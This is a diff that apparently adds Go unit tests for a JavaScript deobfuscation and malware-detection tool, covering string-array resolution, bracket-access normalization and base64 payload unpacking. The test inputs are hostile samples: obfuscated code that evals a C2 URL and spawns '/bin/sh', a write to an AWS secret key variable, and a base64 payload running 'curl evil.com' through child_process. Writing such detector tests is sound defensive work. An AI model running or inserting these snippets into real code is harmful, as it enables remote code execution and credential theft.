@@ -123,3 +123,65 @@ func TestDetectXORLoop(t *testing.T) {
 		t.Errorf("expected DetectXORLoop = false for clean code")
 	}
 }
+
+func TestResolveStringArrays(t *testing.T) {
+	input := `
+var _0xabc = ['eval', 'child_process', 'spawn', 'https://c2.xyz/drop'];
+window[_0xabc[0]](_0xabc[0x3]);
+const req = require(_0xabc[1]);
+req[_0xabc[2]]('/bin/sh');
+`
+	res, changed := ResolveStringArrays(input)
+	if !changed {
+		t.Fatal("expected ResolveStringArrays changed = true")
+	}
+	if !strings.Contains(res, `window['eval']('https://c2.xyz/drop')`) {
+		t.Errorf("expected resolved window['eval'], got:\n%s", res)
+	}
+	if !strings.Contains(res, `require('child_process')`) {
+		t.Errorf("expected resolved require('child_process'), got:\n%s", res)
+	}
+}
+
+func TestNormalizeBracketAccess(t *testing.T) {
+	input := `
+window['eval']('malicious()');
+process['env']['AWS_SECRET_ACCESS_KEY'] = 'stolen';
+globalThis['require']('net');
+`
+	res, changed := NormalizeBracketAccess(input)
+	if !changed {
+		t.Fatal("expected NormalizeBracketAccess changed = true")
+	}
+	if !strings.Contains(res, `window.eval('malicious()')`) {
+		t.Errorf("expected window.eval, got:\n%s", res)
+	}
+	if !strings.Contains(res, `process.env.AWS_SECRET_ACCESS_KEY`) {
+		t.Errorf("expected process.env.AWS_SECRET_ACCESS_KEY, got:\n%s", res)
+	}
+	if !strings.Contains(res, `globalThis.require('net')`) {
+		t.Errorf("expected globalThis.require('net'), got:\n%s", res)
+	}
+}
+
+func TestUnpackBase64_CommentAndTemplateStrings(t *testing.T) {
+	// Base64 for: require('child_process').exec('curl evil.com');
+	b64Payload := "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgZXZpbC5jb20nKTs="
+
+	// 1. Comment block payload
+	commentScript := `
+/* ` + b64Payload + ` */
+function normalCode() { return 42; }
+`
+	_, decoded1 := UnpackBase64Payloads(commentScript)
+	if len(decoded1) != 1 || !strings.Contains(decoded1[0], "child_process") {
+		t.Fatalf("expected comment block payload extracted, got: %v", decoded1)
+	}
+
+	// 2. Template string payload
+	templateScript := "const tpl = `" + b64Payload + "`;\n"
+	_, decoded2 := UnpackBase64Payloads(templateScript)
+	if len(decoded2) != 1 || !strings.Contains(decoded2[0], "child_process") {
+		t.Fatalf("expected template string payload extracted, got: %v", decoded2)
+	}
+}
